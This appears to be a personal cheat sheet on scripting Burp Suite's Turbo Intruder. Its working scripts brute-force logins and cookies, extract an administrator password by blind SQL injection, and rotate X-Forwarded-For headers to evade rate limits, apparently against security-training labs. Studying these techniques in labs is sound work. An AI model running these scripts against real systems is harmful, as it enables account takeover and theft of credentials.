
## Turbo Intruder (BurpSuite extension)

Turbo Intruder allows you to execute a large number of requests, without the throttling effects of Burpsuite Community Edition

The Turbo Intruder window is divided into two sections. In the first section at the top, you can edit the HTTP request. In this section, you can also add insertion points for your payloads.

The second section at the bottom allows you to filter the responses and take action based on the responses returned from the target. It also provides the ability to write custom Python code to better customise your fuzzing script.

---
### Quick Tip

Use splitlines() instead of split("\n")

```python
        rlines = str(req.getRequest()).splitlines()
        for rline in rlines:
            if "GET /labs/e0x02.php" in rline:
                rline_data = rline.split('account=')
                break
```
If Library or function is returning Windows-format text, where each line ends in `'\r\n'`. But you create a list with `x.split('\n')`. That means every line (except possibly the last) will end with `'\r'`.

---
### Output response headers to file
```python
def handleResponse(req, interesting):
    if interesting:
        table.add(req)
        
        data = req.response.encode('utf8')
        
        # Extract header and body
        header, _, body = data.partition('\r\n\r\n')
        
        # Save body to file /tmp/output-turbo.txt
        output_file = open("/tmp/output-turbo.txt","a+")
        output_file.write(body + "\n")
        output_file.close()
```
---

### Delays/Throttling Requests

In our queueRequest() function, we can then define delays between requests and/or pause the process after a certain number of requests as shown below.

```python
secs=timeMins*60+timeSecs  
n=0  
for word in open('/ywh/Wordlist/0-9,a-Z.txt'):  
    time.sleep(throttleMillisecs/1000)  
    engine.queue(target.req, word.rstrip())  
    n+=1  
    if(n==triedWords):  
        time.sleep(secs)  
        n=0
```
This allows us, for example, to perform our fuzzing with a delay between each request and a maximum number of requests that can be sent before a pause occurs. In this Python code, we send a request every half second and pause for 10 seconds after 20 requests have been sent to our target (_more complex rate limits can also be achieved_).

---

### Responses filters

The function `handleResponse()` makes it possible to filter the responses according to the data they contain. This is useful to avoid getting too much junk and/or false positives/negatives during the fuzzing process.

The code snippets below show an example of the different filters and once a response has passed the filter, the function table.add(req) adds the response to be displayed in the _result table_ shown during the fuzzing process.

```python
# req.status (_Status of the response_)
if req.status != 500:  
    table.add(req)

# req.time (_Response time_)
if req.time > 3000:  
    table.add(req)

# **req.length (_Response length_)
if req.length == 5689:  
    table.add(req)

# **req.wordcount (_Response word count_)
if req.wordcount == 31:  
    table.add(req)

# **req.label (_Request label_)
if req.label == "test":  
    table.add(req)

if "string to hunt" in req.response:
    table.add(req)

```
---

### Collecting Responses

Since we use Python code, we can easily open a file and add the information to the file that we have collected during the process. The reason why this can be useful is that in some cases, requests and/or responses containing specific information can be saved in separate files and later managed by other tools.

Below you can see an example where we collect and save the request in a separate file.

```python
# **Retrieve the request:**
with open('C://folder/request.txt','a') as f:  
    f.write(str(req.getRequest()))  
    f.close()

# **Retrieve our query parameter:**
request = str(req.getRequest())  
param = request.split('?')[1][:1]  
  
with open('C://folder/params.txt','a') as f:  
    f.write(param)  
    f.close()

# **Collect the response:**
data = req.response.encode('utf8')  
header, _, body = data.partition('\r\n\r\n')  
  
with open('C://folder/responses.txt','a') as f:  
    f.write(data) #or header or body  
    f.close()
```
---

### 2 List ClusterBombs

The following script grabs item 1 from list 1, and iterates over every item in list 2 before proceeding to item 2 in list 1. 

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=50,
                           pipeline=False
                           )

    for firstWord in open('/Users/dude/Desktop/burp_numlist_1_120.txt'):
      for secondWord in open('/Users/dude/Desktop/burp_passwords.txt'):
        engine.queue(target.req, [firstWord.rstrip(), secondWord.rstrip()])


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)

```

#### Another example 
alphanumeric chars in substr position

Request
```http
GET /labs/i0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substr(database(),%s,1)='%s'#
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i
Cache-Control: max-age=0
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for i in range(1,20):
      for secondWord in open('/home/kali/Desktop/alpha_numeric.txt'):
        engine.queue(target.req, [str(i), secondWord.rstrip()])


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if "Welcome to your dashboard!" in req.response:
        table.add(req)
```
---

### Blind SQLi

Request during execution, payload positions on both SUBSTR start position, and current payload value

```http
GET / HTTP/1.1
Host: 0afa007503f29463807a5d53009b0000.web-security-academy.net
Cookie: TrackingId=ll5ui1rNRpzefPkw' AND SUBSTR((SELECT password from users WHERE username = 'administrator'), %s, 1) = '%s; session=irPHIgyo9us6j0ubE5BDUC5ZfFdGHGeM
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0afa007503f29463807a5d53009b0000.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Turbo Intruder script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=40,
                           pipeline=False
                           )

    for charPos in range(1,25):
        for word in open('/Users/dude/Desktop/alpha_numeric_lower.txt'):
         # send both params to request in list
            engine.queue(target.req, [str(charPos), word.rstrip()])
   
def handleResponse(req, interesting):
    if 'Welcome' in req.response:
        table.add(req)

        lines = str(req.getRequest()).split('\n')
        for line in lines:
            if 'Cookie:' in line:
                cookie_split = line.split()
				final_data = cookie_split[11].strip(',') + '~' + cookie_split[14].strip('\';') + '\n'   
                with open('/Users/dude/Desktop/params.txt','a') as f:  
                    f.write(final_data)
                    f.close()
```

---

### Encoding and Hashing

The following script is used in a Burpsuite attack that brute forces a cookie that is of the format:
`base64(username+`:'+md5HashOfPassword)`

The meat of the script does the following before sending it to a request:
1) Get word from PW list, and MD5 it
2) Join username `carlos` and attach it to MD5 hash `carlos:XXXXXXXXXX`
3) base64 encode the whole thing and send it as the Stay-logged-in cookie

```python
import base64
import hashlib

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    for word in open('/Users/dude/Desktop/burp_passwords.txt'):

        # 1 - get word from list, MD5 it
        pword = word.rstrip()
        hashed_pw = hashlib.md5(pword.encode("utf-8")).hexdigest()

        # 2 - joing username to hash   ex weiner:xxxxxxxxxx
        full_string = "carlos:" + hashed_pw

        # 3 - base64 the whole enchilata
        encoded = base64.b64encode(full_string)
        engine.queue(target.req, encoded.rstrip())

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```
---

### Pitchfork

The following script runs 2 payloads in a pitchfork attack.

In the following, I didn't log 200 responses because I knew that I was looking for a 302, but I could have also used: 
```python
 if req.status = 302:
    table.add(req)
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    payload1 = []
    payload2 = []
    for eachWord in open('usernames.txt'):
        payload1.append(eachWord.strip())
    for eachWord in open('passwords.txt'):
        payload2.append(eachWord.strip())
    for i in range(0,len(payload2) if(len(payload2)<=len(payload1)) else len(payload1)):
        # execute till the length of smaller payload.
        engine.queue(target.req, [payload1[i], payload2[i]])

def handleResponse(req, interesting):
    # currently available attributes are 
    # req.status, req.wordcount, req.length and req.response
    if req.status != 200:
        table.add(req)
```
---

### Programatically configuring IP address payload position

The following HTTP request has 2 payload positions 
- 3rd octet in X-Forwarded-For IP address
- password in Post Data

The HTTP Request with payload positions editing in BurpSuite
```http
POST /login HTTP/1.1
Host: 0a2c008503f266e6813bb10e00260015.web-security-academy.net
Cookie: session=pnlyfBmXMn4B49TIi0ShAQ1WtJaQtDoN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c008503f266e6813bb10e00260015.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0a2c008503f266e6813bb10e00260015.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 192.168.%s.231
Connection: keep-alive

username=app01&password=%s
```

The following Turbo Intruder Script programmatically adds the IP address payload, and iterates a password list to complete each test

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    i = 1
    for word in open('/Users/dude/Desktop/burp_passwords.txt'):
        i = i + 1
        # send both params to request in list
        engine.queue(target.req, [str(i), word.rstrip()])

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)

```
